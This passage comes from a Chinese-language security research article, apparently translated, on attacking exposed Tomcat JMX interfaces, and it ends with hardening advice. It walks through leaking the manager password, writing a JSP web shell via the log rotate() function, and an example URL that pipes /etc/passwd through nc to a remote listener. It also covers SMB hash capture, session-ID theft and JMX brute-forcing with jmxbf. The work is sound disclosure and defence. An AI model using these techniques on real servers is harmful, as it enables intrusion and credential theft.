<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/4.jpg"><img class="alignnone size-full wp-image-55374" src="http://www.secpulse.com/wp-content/uploads/2017/02/4.jpg" alt="4" width="944" height="207" /></a></p>
<p>图4 – 目标中的SSL没有开启</p>
<p>单击Insecure connection按钮继续。当启用认证，通常会显示以下提示：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/5.jpg"><img class="alignnone size-full wp-image-55375" src="http://www.secpulse.com/wp-content/uploads/2017/02/5.jpg" alt="5" width="944" height="192" /></a></p>
<p>图5 – 认证启动的提示</p>
<p>在这种情况下，您应该使用username和password文本框输入一些有效的凭据。请注意，也可能由于其他原因获得连接失败错误。</p>
<p>连接失败的常见原因之一是由于攻击者和服务器之间的防火墙。此防火墙可能配置为阻止传入流量到由Tomcat启动的其他Java RMI进程使用的端口（例如，上面nmap扫描输出中列出的49222/tcp）。</p>
<p>使用您喜欢的网络嗅探器进行流量捕获，以了解“连接失败”错误是否与认证相关。</p>
<p>在下面的示例中，Tomcat JMX服务器（运行于192.168.11.128）正在返回包含认证失败错误的RMI消息：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/6.jpg"><img class="alignnone size-full wp-image-55376" src="http://www.secpulse.com/wp-content/uploads/2017/02/6.jpg" alt="6" width="530" height="400" /></a></p>
<p>图6 – 认证失败-暗示需要认证凭据</p>
<p>请注意，上面的错误包括需要凭据的字符串，表示在JConsole初始屏幕中未指定任何凭据。</p>
<p>在输入一些凭据时返回不同的错误消息：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/7.jpg"><img class="alignnone size-full wp-image-55377" src="http://www.secpulse.com/wp-content/uploads/2017/02/7.jpg" alt="7" width="834" height="400" /></a></p>
<p>图7 – 不可靠的用户名和密码</p>
<p>如果未启用认证（这在某些内部网络渗透测试中可能是正确的），显示如下：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/8.jpg"><img class="alignnone size-full wp-image-55378" src="http://www.secpulse.com/wp-content/uploads/2017/02/8.jpg" alt="8" width="479" height="400" /></a></p>
<p>图8 – Jconsole连接到远程的Tomcat JMX接口</p>
<p>事情开始变的有趣。</p>
<p>从这一点开始，我们将考虑攻击者能够识别一个监听的Tomcat JMX接口并可以使用JConsole连接到它的情况。这是可能的，因为认证未启用，或者因为攻击者能够猜到一些有效的凭据。</p>
<h2><strong>0x04 使用JMX读取Tomcat管理器的密码</strong></h2>
<hr />
<p>假设Tomcat启用了管理器应用程序，但是没有使用任何弱凭据（如admin/admin或tomcat/manager）。假设攻击者试图使用自动脚本来强制一个有效的密码而不成功。</p>
<p>在这里，可能得出没有方法发现管理器密码的结论。</p>
<p>事实上，有一个简单的方法，在忽略密码强度的情况下恢复密码，在写文章的这一刻，这个技术还没有参考。</p>
<p>这个方法是在你的机器上面启动JConsole并且指向远程的Tomcat JMX服务器。选择MBeans选项卡：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/9.jpg"><img class="alignnone size-full wp-image-55379" src="http://www.secpulse.com/wp-content/uploads/2017/02/9.jpg" alt="9" width="944" height="258" /></a></p>
<p>图9 – 选择MBeans</p>
<p>之后显示如下：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/10.jpg"><img class="alignnone size-full wp-image-55380" src="http://www.secpulse.com/wp-content/uploads/2017/02/10.jpg" alt="10" width="848" height="278" /></a></p>
<p>图10 – Mbeans</p>
<p>展开Users目录，且选择下面的节点：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">Users-&gt;User-&gt;”manager”-&gt;UserDatabase-&gt;Attributes</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>你应该能够看见类似下面的一些东西，这些暗示了凭据：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/111.jpg"><img class="alignnone size-full wp-image-55381" src="http://www.secpulse.com/wp-content/uploads/2017/02/111.jpg" alt="11" width="876" height="350" /></a></p>
<p>图11 – 泄漏的Tomcat管理器的用户名和密码</p>
<p>在这里，你能使用发现的凭据来连接到远程Tomcat管理器，以控制服务器。</p>
<h2><strong>0x05 日志循环函数中的<a href="https://www.secpulse.com/archives/tag/目录遍历" target="_blank">目录遍历</a></strong></h2>
<hr />
<p>如果你已经看到了这里，你已经有了一个好且简单的方法来访问Tomcat管理器，来破环底层服务器。</p>
<p>执行此操作的典型方法是部署简单的Web应用程序存档（WAR），包括允许执行操作系统（OS）命令的代码，然后调查服务器上的内容。</p>
<p>如果服务器在Windows上运行，则大多数时间它将作为SYSTEM或管理员运行。因此，你的操作系统命令将在最高权限级别运行。</p>
<p>但是，如果由于某些原因Tomcat管理器不在那里怎么办？</p>
<p>虽然在内部网络中部署的服务器则不可能是这种情况，但是仍然有可能，因此我们需要另一种方法来浏览服务器，假设我们仍然能够连接Tomcat JMX接口。</p>
<p><strong>日志循环函数</strong></p>
<p>在大量的具有写权限的Tomcat JMX MBeans操作中，有一个显示了有趣的行为。当JMX服务没有配置支持认证时，这个特别的功能也能访问。下面是它的Java特征：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">boolean rotate(string newFileName)</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>上面的特征在下面的节点提供：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">Catalina-&gt;Valve-&gt;localhost-&gt;AccessLogValve-&gt;Operations</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>这表明rotate函数用于备份Tomcat访问日志到服务器上的文件中。</p>
<p>为了证明这个，下载了运行Tomcat8.0.39的Bitnami Linux VM。然后配置服务器来公开JMX端口，以便允许使用JConsole进行连接。最后totate函数用此位置指定文件：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">/tmp/test.log</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>完成这个过程后，下面的确认消息由服务器返回：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/12.jpg"><img class="alignnone size-full wp-image-55382" src="http://www.secpulse.com/wp-content/uploads/2017/02/12.jpg" alt="12" width="531" height="323" /></a></p>
<p>图12 – ‘True’确认消息被执行</p>
<p>可以确认test.log文件在tmp目录中。直到rotate函数被调用，目录的内容是Tomcat访问日志。</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">bitnami@ubuntu:/tmp$ cat /tmp/test.log</code></div>
<div class="line number2 index1 alt1"><code class="plain plain">192.168.11.1 - - [08/Dec/2016:14:50:42 +0000] "GET /test-log-request HTTP/1.1" 404 1026</code></div>
<div class="line number3 index2 alt2"><code class="plain plain">bitnami@ubuntu:/tmp$</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p><strong>在服务器上面执行OS命令</strong></p>
<p>正如上一节讨论的，rotate函数允许在服务器的任意目录中存储文件。它还将允许选择该文件的任意扩展。</p>
<p>这意味着，作为一个攻击者，我们滥用它来在Tomcat提供网络服务的目录中创建一个Java Servlet Page（JSP）文件。在这里我们的目标创建包含JSP指令的文件来在服务器上面执行命令。</p>
<p>为了实现这个，我们首先需要的是使用在URL中包含有效的JSP代码的请求来破环Tomcat访问日志。</p>
<p>例如，使用Burp Suite Repeater来发送下面的请求。注意在这个例子中，我们测试的Tomcat运行在80/tcp端口：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/13.jpg"><img class="alignnone size-full wp-image-55383" src="http://www.secpulse.com/wp-content/uploads/2017/02/13.jpg" alt="13" width="482" height="350" /></a></p>
<p>图13 – 发送的请求</p>
<p>现在我们需要的是找到一个可靠的路径来存放我们的使用rotate函数的JSP文件。关于这个我们能利用JConsole界面中的一些信息。</p>
<p>VM的Summary选项卡能提供一些关于catalina.base属性的信息。这个选项卡包含一个节（在窗口底部），显示了Java VM的参数。</p>
<p>例子显示如下：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/14.jpg"><img class="alignnone size-full wp-image-55384" src="http://www.secpulse.com/wp-content/uploads/2017/02/14.jpg" alt="14" width="862" height="158" /></a></p>
<p>图14 – catalina.base文件夹</p>
<p>Catalina.base目录应该返回一个webapps文件夹，其中是Tomcat提供的各种网络服务。</p>
<p>部署在服务器上的网络应用可以在MBeans选项卡中看到。</p>
<p>下面的截图是Tomcat服务器默认的应用的例子：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/15.jpg"><img class="alignnone size-full wp-image-55385" src="http://www.secpulse.com/wp-content/uploads/2017/02/15.jpg" alt="15" width="465" height="362" /></a></p>
<p>图15 – Tomcat上默认的应用</p>
<p>将cataline.base目录的信息和Tomcat上的应用列表放在一起，找到存储我们JSP文件的目录还是可能的。</p>
<p>例如，一个test.jsp文件存储在/docs文件夹中：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">/opt/bitnami/apache-tomcat/webapps/docs/test.jsp</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>在这里，上面的路径可以和rotate函数一起使用：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/16.jpg"><img class="alignnone size-full wp-image-55386" src="http://www.secpulse.com/wp-content/uploads/2017/02/16.jpg" alt="16" width="496" height="244" /></a></p>
<p>图16 – test.jsp文件被创建</p>
<p>我们能打开浏览器并运行一个命令。在下面的截图中一个命令被执行，用来把/etc/passwd的内容粘帖到nc客户端中，继而连接一个远程监听器：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/17.jpg"><img class="alignnone size-full wp-image-55387" src="http://www.secpulse.com/wp-content/uploads/2017/02/17.jpg" alt="17" width="511" height="400" /></a></p>
<p>图17 – 远程服务器上面的数据</p>
<p>作为参考，执行命令的URL显示如下：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">http://192.168.11.141/docs/test.jsp?cmd=sh%20-c%20$@|sh%20.%20echo%20/bin/cat%20/etc/passwd%20|%20nc%20192.168.11.136%208080</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>这包括一些调整，允许使用管道将输出从一个命令重定向到另一个命令。</p>
<p>如果需要，目前为止的web shell也可以用来执行wget命令，并从远程机器上面下载一个更多功能的JSP shell。</p>
<p><strong>捕获SMB challenge-responses hashes</strong></p>
<p>正如已经讨论的，如果你的Tomcat服务器在Windows上面运行，意味着通过JSP shell执行的命令和通过rotate函数创建的命令将以最高权限运行。</p>
<p>然而，有时可能出现不正确的情况，且服务器运行在域账户。如果那种情况，捕获SMB challenge-responses和破解他们是可能的。Rotate函数也在这里使用。</p>
<p>为了测试攻击场景，Kali虚拟机可以用来启动Metasploit SMB capture auxiliary module。</p>
<p>使用JConsole执行JMX连接，并且使用下面的参数使用rotate函数：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">\\192.168.11.136\test</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>在这种情况，上面的IP地址是Kali虚拟机。下面的截图确认了Tomcat向远程IP发送了一个请求，能够3次捕获SMB challenge：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/18.jpg"><img class="alignnone size-full wp-image-55388" src="http://www.secpulse.com/wp-content/uploads/2017/02/18.jpg" alt="18" width="663" height="350" /></a></p>
<p>图18 – 捕获的SMB challenge response</p>
<p><strong>通过创建其他文件类型来进行client-side攻击</strong></p>
<p>注意，rotate函数也能用来创建敏感文件（如HTML文件），并且在网络应用中存储他们，以便执行跨站脚本攻击。</p>
<p>这个涉及到，重复上述步骤，使用可靠的HTML代码污染日志文件，然后在Tomcat网络应用程序目录中存储一个HTML文件。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/19.jpg"><img class="alignnone size-full wp-image-55389" src="http://www.secpulse.com/wp-content/uploads/2017/02/19.jpg" alt="19" width="466" height="350" /></a></p>
<p>图19 – html文件</p>
<h2><strong>0x06 抓取网络应用的用户的session ID</strong></h2>
<hr />
<p>另外的Tomcat JMX操作能被攻击者利用来劫持Tomcat网络应用的用户的会话，lisrSessionIds()在下面的节点显示：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">Catalina-&gt;Manager-&gt;[ApplicationName]-&gt;Operations-&gt;listSessionIds()</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>这个操作通常可用于Tomcat上部署的每个网络应用中，且如名称所示，能返回连接应用的用户的所有的JSESSIONID。</p>
<p>例如，下面的截图显示了连接管理器应用的用户的session ID：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/1d.jpg"><img class="alignnone size-full wp-image-55390" src="http://www.secpulse.com/wp-content/uploads/2017/02/1d.jpg" alt="1d" width="570" height="400" /></a></p>
<p>通过Tomcat JMX服务可用的操作之一将允许检索JSESSIONID cookie值，因此可能允许攻击者通过劫持他们的会话来假冒另一个用户。</p>
<p>注意，由于需要该帐户的有效用户名和密码，因此无法利用此问题访问管理器应用程序。然而，部署在服务器上的其他应用程序（例如支持基于JSESSIONID cookie的认证的应用程序）会受到影响。</p>
<p>能够运行listSessionIds()数的攻击者将能够劫持另一个用户的会话。</p>
<p>注意，listSessionIds()是另一个操作，它只对具有写入权限的JMX用户可用。</p>
<p>如果JMX服务器配置为允许未经认证的访问，那么它仍然可以使用。</p>
<h2><strong>0x07 暴力破解进入Tomcat JMX</strong></h2>
<hr />
<p>当Tomcat JMX服务配置为启用认证并且使用强密码时，仍有可能获得<a href="https://www.secpulse.com/archives/tag/未经授权" target="_blank">未经授权</a>的访问。</p>
<p>实际上，为此服务实现的认证过程在登录失败后不会锁定帐户，因此容易受到暴力密码破解攻击。</p>
<p>PoC工具（jmxbf）已经由作者开发来演示这个。</p>
<p>使用例子如下：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
<div class="line number6 index5 alt1">6</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">$&gt;Usage: </code></div>
<div class="line number2 index1 alt1"><code class="plain plain">java -jar jmxbf.jar</code></div>
<div class="line number3 index2 alt2"><code class="plain plain">-h,--host &lt;arg&gt; The JMX server IP address.</code></div>
<div class="line number4 index3 alt1"><code class="plain spaces"> </code><code class="plain plain">-p,--port &lt;arg&gt; The JMX server listening port.</code></div>
<div class="line number5 index4 alt2"><code class="plain spaces"> </code><code class="plain plain">-pf,--passwords-file &lt;arg&gt; File including the passwords, one per line.</code></div>
<div class="line number6 index5 alt1"><code class="plain spaces"> </code><code class="plain plain">-uf,--usernames-file &lt;arg&gt; File including the usernames, one per line.</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>Example:</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">$&gt;java –jar jmxbf.jar –h 192.168.20.1 –p 1099 –uf usernames.txt –pf passwords.txt</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>一些例子输出如下：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
<div class="line number6 index5 alt1">6</div>
<div class="line number7 index6 alt2">7</div>
<div class="line number8 index7 alt1">8</div>
<div class="line number9 index8 alt2">9</div>
<div class="line number10 index9 alt1">10</div>
<div class="line number11 index10 alt2">11</div>
<div class="line number12 index11 alt1">12</div>
<div class="line number13 index12 alt2">13</div>
<div class="line number14 index13 alt1">14</div>
<div class="line number15 index14 alt2">15</div>
<div class="line number16 index15 alt1">16</div>
<div class="line number17 index16 alt2">17</div>
<div class="line number18 index17 alt1">18</div>
<div class="line number19 index18 alt2">19</div>
<div class="line number20 index19 alt1">20</div>
<div class="line number21 index20 alt2">21</div>
<div class="line number22 index21 alt1">22</div>
<div class="line number23 index22 alt2">23</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">$&gt;java –jar jmxbf.jar –h 192.168.20.1 –p 1099 –uf usernames.txt –pf passwords.txt</code></div>
<div class="line number2 index1 alt1"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number3 index2 alt2"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number4 index3 alt1"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number5 index4 alt2"><code class="plain plain">. . .</code></div>
<div class="line number6 index5 alt1"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number7 index6 alt2"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number8 index7 alt1"><code class="plain plain">###SUCCESS### - We got a valid connection for: control:supersecretpwd</code></div>
<div class="line number9 index8 alt2"><code class="plain plain">Found some valid credentials - continuing brute force</code></div>
<div class="line number10 index9 alt1"><code class="plain plain">....</code></div>
<div class="line number11 index10 alt2"><code class="plain plain">###SUCCESS### - We got a valid connection for: monitor:monitor</code></div>
<div class="line number12 index11 alt1"><code class="plain plain">Found some valid credentials - continuing brute force</code></div>
<div class="line number13 index12 alt2"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number14 index13 alt1"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number15 index14 alt2"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number16 index15 alt1"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number17 index16 alt2"><code class="plain plain">. . .</code></div>
<div class="line number18 index17 alt1"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number19 index18 alt2"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number20 index19 alt1"><code class="plain plain">Auth failed!!!</code></div>
<div class="line number21 index20 alt2"><code class="plain plain">The following valid credentials were found:</code></div>
<div class="line number22 index21 alt1"><code class="plain plain">control:supersecretpwd</code></div>
<div class="line number23 index22 alt2"><code class="plain plain">monitor:monitor</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>这个工具通过github可以下载到：<a href="https://github.com/nccgroup/jmxbf">https://github.com/nccgroup/jmxbf</a>  。</p>
<h2><strong>0x08 其他问题？</strong></h2>
<hr />
<p>正如已经提到的，MBeans操作的大列表和属性能提供给连接Tomcat JMX服务的用户使用。可能还有其他函数，可以使用与上面讨论的rotate函数问题所示的类似的方式。</p>
<p>深入研究才能确定。</p>
<p>如果由于强大的认证措施让你无法访问Tomcat JMX控制台，则仍然有潜在的方法来破坏服务器。</p>
<p>Tomcat最近修补了两个与Java反序列化相关的漏洞，如果暴露了JMX服务器，可以利用这些漏洞：</p>
<p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427</a></p>
<p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8735">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8735</a></p>
<p>本文不讨论这些漏洞的细节，但是却可以说如果你的Tomcat运行在老版本的Java系统中，是可能通过发送特定的包到JMX服务器来实现RCE。</p>
<p>进一步研究后再发布新文。</p>
<p><strong>0x09 建议</strong></p>
<hr />
<p>有很多可以实现的建议，来保护有本文讨论的问题的Tomcat服务器。</p>
<p>首先，建议对JMX服务的访问使用防火墙。只有列入白名单的IP地址才能连接。</p>
<p>然而，应该始终启用强密码的认证。下面是在Windows使用setenv.bat启动认证的例子：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
<div class="line number6 index5 alt1">6</div>
<div class="line number7 index6 alt2">7</div>
<div class="line number8 index7 alt1">8</div>
<div class="line number9 index8 alt2">9</div>
<div class="line number10 index9 alt1">10</div>
<div class="line number11 index10 alt2">11</div>
<div class="line number12 index11 alt1">12</div>
<div class="line number13 index12 alt2">13</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">SET JAVA_HOME={replace with full path to Java JDK}</code></div>
<div class="line number2 index1 alt1"><code class="plain plain">SET JRE_HOME=%JAVA_HOME%</code></div>
<div class="line number3 index2 alt2"><code class="plain plain">SET JAVA_OPTS=%JAVA_OPTS% -Xms256m -Xmx512m -XX:MaxPermSize=256m -server</code></div>
<div class="line number4 index3 alt1"><code class="plain plain">SET CATALINA_OPTS=-Dcom.sun.management.jmxremote </code></div>
<div class="line number5 index4 alt2"><code class="plain plain">-Dcom.sun.management.jmxremote.port=1099 </code></div>
<div class="line number6 index5 alt1"><code class="plain plain">-Dcom.sun.management.jmxremote.rmi.port=1099 </code></div>
<div class="line number7 index6 alt2"><code class="plain plain">-Dcom.sun.management.jmxremote.ssl=true </code></div>
<div class="line number8 index7 alt1"><code class="plain plain">-Dcom.sun.management.jmxremote.local.only=false </code></div>
<div class="line number9 index8 alt2"><code class="plain plain">-Djava.rmi.server.hostname={replace with Tomcat server IP address}</code></div>
<div class="line number10 index9 alt1"><code class="plain plain">SET CATALINA_OPTS=%CATALINA_OPTS% </code></div>
<div class="line number11 index10 alt2"><code class="plain plain">-Dcom.sun.management.jmxremote.authenticate=true </code></div>
<div class="line number12 index11 alt1"><code class="plain plain">-Dcom.sun.management.jmxremote.password.file=%CATALINA_BASE%/conf/jmxremote.password </code></div>
<div class="line number13 index12 alt2"><code class="plain plain">-Dcom.sun.management.jmxremote.access.file=%CATALINA_BASE%/conf/jmxremote.access</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>下面是Linux下面使用setenv.sh的例子：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
<div class="line number6 index5 alt1">6</div>
<div class="line number7 index6 alt2">7</div>
<div class="line number8 index7 alt1">8</div>
<div class="line number9 index8 alt2">9</div>
<div class="line number10 index9 alt1">10</div>
<div class="line number11 index10 alt2">11</div>
<div class="line number12 index11 alt1">12</div>
<div class="line number13 index12 alt2">13</div>
<div class="line number14 index13 alt1">14</div>
<div class="line number15 index14 alt2">15</div>
<div class="line number16 index15 alt1">16</div>
<div class="line number17 index16 alt2">17</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">JAVA_HOME={replace with full path to Java JDK}</code></div>
<div class="line number2 index1 alt1"><code class="plain plain">JRE_HOME=$JAVA_HOME</code></div>
<div class="line number3 index2 alt2"><code class="plain plain">JAVA_OPTS="-Djava.awt.headless=true -XX:+UseG1GC -Dfile.encoding=UTF-8 $JAVA_OPTS "</code></div>
<div class="line number4 index3 alt1"><code class="plain plain">JAVA_OPTS="-XX:MaxPermSize=256M -Xms256M -Xmx512M $JAVA_OPTS " </code></div>
<div class="line number5 index4 alt2"><code class="plain plain">CATALINA_OPTS="-Dcom.sun.management.jmxremote </code></div>
<div class="line number6 index5 alt1"><code class="plain plain">-Dcom.sun.management.jmxremote.port=1099 </code></div>
<div class="line number7 index6 alt2"><code class="plain plain">-Dcom.sun.management.jmxremote.rmi.port=1099 </code></div>
<div class="line number8 index7 alt1"><code class="plain plain">-Dcom.sun.management.jmxremote.ssl=true </code></div>
<div class="line number9 index8 alt2"><code class="plain plain">-Dcom.sun.management.jmxremote.local.only=false </code></div>
<div class="line number10 index9 alt1"><code class="plain plain">-Djava.rmi.server.hostname={replace with Tomcat server IP address} </code></div>
<div class="line number11 index10 alt2"><code class="plain plain">-Dcom.sun.management.jmxremote.authenticate=true </code></div>
<div class="line number12 index11 alt1"><code class="plain plain">-Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password </code></div>
<div class="line number13 index12 alt2"><code class="plain plain">-Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access" </code></div>
<div class="line number14 index13 alt1"><code class="plain plain">export JAVA_HOME</code></div>
<div class="line number15 index14 alt2"><code class="plain plain">export JRE_HOME</code></div>
<div class="line number16 index15 alt1"><code class="plain plain">export JAVA_OPTS</code></div>
<div class="line number17 index16 alt2"><code class="plain plain">export CATALINA_OPTS</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>SSL也应该开启，以保护认证过程中凭据嗅探攻击。</p>
<p>注意，在上述所有的配置中，jmxremote.ssl变量设为true。</p>
<p>然而，没有包括正确启用SSL其他的一些变量。需要的其他配置步骤在这里不再详述。</p>
<p>下面的URL包含了这个任务的参考信息：</p>
<p><a href="https://db.apache.org/derby/docs/10.10/adminguide/radminjmxenablepwdssl.html">https://db.apache.org/derby/docs/10.10/adminguide/radminjmxenablepwdssl.html</a></p>
<p><a href="https://www.ibm.com/support/knowledgecenter/SSYMRC_6.0.1/com.ibm.jazz.repository.web.admin.doc/topics/t_server_mon_tomcat_option3.html">https://www.ibm.com/support/knowledgecenter/SSYMRC_6.0.1/com.ibm.jazz.repository.web.admin.doc/topics/t_server_mon_tomcat_option3.html</a></p>
<p>强烈推荐为只读和读写用户在jmxremote.password文件中设置高强度密码保护。这些应该与Tomcat管理器不同。</p>
<p>并且，考虑为所有用户选择不常用的用户名。</p>
<p>另外，只有Tomcat用户才被允许读取jmxremote.password文件。如果检测到这个文件的读权限太宽松，Tomcat将不会启动。</p>
<p>下面的命令能被用来在Windows上面设置这些权限：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">cacls jmxremote.password /P [username]:R</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>尽管JMX访问等同于admin/root访问，如果一个人能够以只读用户身份访问JMX服务，那么仍然可能看到Tomcat管理器用户名和密码。</p>
<p>的确，只读用户将不被允许运行任何JMX操作，但他们仍然能够访问一个敏感的信息，在大多数情况下，将导致Tomcat服务器的破环。</p>
<p>关于rotate函数的问题，作者认为应该严格的控制，以避免Tomcat JMX服务器在服务器上可用的任何文件夹上创建具有任何扩展名的日志文件。</p>
<p>通过这个函数创建的日志文件只能在Tomcat日志文件夹中创建，并且无法使用URL访问。</p>
<p>最后，考虑在系统上存储一个哈希版本的Tomcat管理器密码（因为这个哈希将在JMX属性中可见）而不是纯文本版本。</p>
<p>注意，这是我们从Tomcat收到的一个建议，同时讨论了JMX只读用户能够读取管理器的密码的问题。然而，这种情况下如果用户名还是明文，攻击者可以使用离线密码破解工具破解密码。</p>
<p>下面的URL包含了存储哈希版本密码的一些参考：</p>
<p><a href="https://tomcat.apache.org/tomcat-8.0-doc/realm-howto.html#Digested_Passwords">https://tomcat.apache.org/tomcat-8.0-doc/realm-howto.html#Digested_Passwords</a></p>
<p><a href="http://www.jdev.it/encrypting-passwords-in-tomcat/">http://www.jdev.it/encrypting-passwords-in-tomcat/</a></p>
<p><a href="https://leanjavaengineering.wordpress.com/2011/02/04/tomcat-digested-passwords/">https://leanjavaengineering.wordpress.com/2011/02/04/tomcat-digested-passwords/</a></p>
<p>下面是digest工具的使用例子：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">digest.bat -s 0 -i 1 themanagersecretpassword</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>将输出明文和加密的凭据：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
